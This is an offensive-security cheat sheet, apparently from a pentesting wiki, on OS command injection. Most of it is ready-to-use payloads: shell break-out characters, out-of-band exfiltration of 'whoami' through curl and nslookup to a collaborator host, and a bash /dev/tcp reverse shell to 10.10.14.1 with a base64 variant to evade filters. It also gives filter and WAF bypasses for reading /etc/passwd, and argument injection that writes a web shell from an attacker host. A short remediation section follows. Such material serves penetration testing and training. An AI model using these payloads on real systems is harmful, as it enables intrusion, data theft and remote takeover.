---
tags:
  - Web
---

# :material-console: OS Command Injection

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

When user input reaches a shell call (`system()`, `exec()`, backticks), you can append your own commands. It's the shortest path from web bug to shell.

!!! abstract "TL;DR"
    Find input used in a filename, ping, PDF/convert, or archive feature. Break out with a shell metacharacter, then confirm with a delay or an out-of-band callback.

## :material-magnify: Break-out characters

```text
; ls          # command separator
| id          # pipe into your command
& whoami      # background / chain
`id`  $(id)   # command substitution
%0a id        # newline (URL-encoded)
```

## :material-clock-outline: Blind detection

No output on the page — prove execution another way:

=== "Time-based"

    ```bash
    ping -c 5 127.0.0.1      # ~5s delay = injection
    sleep 5
    ```

=== "Out-of-band (OAST)"

    ```bash
    curl http://COLLAB.oastify.com/$(whoami)
    nslookup `whoami`.COLLAB.oastify.com
    ```

    Data exfiltrates through DNS/HTTP even when the app shows nothing.

## :material-shield-sword: Get a shell

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1'
# encode to dodge filters:
echo -n 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1' | base64
# ...;echo <b64>|base64 -d|bash
```

!!! opsec "Loud and logged"
    Spawned shells and outbound connections light up EDR. Prefer a single OAST confirmation before going interactive.

## :material-alert-decagram: Edge cases & gotchas

=== "Windows targets"

    Different shell, different separators:
    ```text
    & whoami          |  cmd chaining        (also &&, ||)
    | whoami          |  pipe
    %0a               |  newline
    ```
    OAST on Windows: `nslookup %USERNAME%.COLLAB.oastify.com` or
    `certutil -urlcache -f http://COLLAB/ x`. PowerShell context uses `;` and
    `$(...)` like bash but different builtins.

=== "Filter bypass"

    ```bash
    # Blocked spaces
    cat</etc/passwd            ${IFS}         cat$IFS$9/etc/passwd
    {cat,/etc/passwd}          X=$'cat\x20/etc/passwd';$X
    # Blocked slashes
    cat ${HOME:0:1}etc${HOME:0:1}passwd
    # Keyword filtered (whoami) — break it up, shell reassembles
    w'h'o'a'm'i    wh""oami    who$@ami    $(rev<<<'imaohw')
    # Base64 the whole thing
    echo d2hvYW1p|base64 -d|bash
    ```

=== "Argument injection (no separator)"

    When your input becomes *one argument* to a fixed binary (no `;`/`|` possible),
    abuse the binary's own flags:
    ```text
    # input passed to: curl <input>     ->  -o /var/www/shell.php http://ATTACKER/s
    # input passed to: tar <input>      ->  --checkpoint-action=exec=sh ...
    # a leading -/-- turns your value into an option
    ```
    Look for `ffmpeg`, `curl`, `wget`, `tar`, `zip`, `find`, `git` — each has a
    flag that reads/writes files or runs code.

!!! bug "Why the delay/callback never comes"
    - **`system()` vs arg-list exec:** if the app uses `execve` with a fixed argv
      (no shell), metacharacters are literal — you need *argument* injection, not
      command injection.
    - **The command is truncated:** your payload runs but a trailing fixed suffix
      (`... 2>/dev/null` or `".jpg"`) breaks it — comment it out (`#`, or `%00`
      where a null still truncates) or make it a valid continuation.
    - **Output is swallowed but timing lies too** — `ping` count/flags differ on
      Windows (`ping -n 5`). Use OAST (DNS) as the ground truth; DNS resolves even
      through egress firewalls that block your reverse shell.
    - **WAF strips one layer** — double-URL-encode, or move the payload to a header
      the fetcher passes to the shell (`User-Agent` into a log-processing command is
      a classic).

## :material-shield-check: Remediation

- Avoid the shell entirely — use language APIs (`subprocess` with an arg **list**, no `shell=True`).
- If unavoidable, allowlist input and use `shlex.quote`; never blocklist characters.

## :material-link-variant: Related

- Filtered? Same bypass tricks apply to [SSTI](ssti.md) and [Deserialization](deserialization.md).
- Got a shell → [Linux Privesc](../privesc/linux.md) / [Windows Privesc](../privesc/windows.md).
- Reference: [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings).
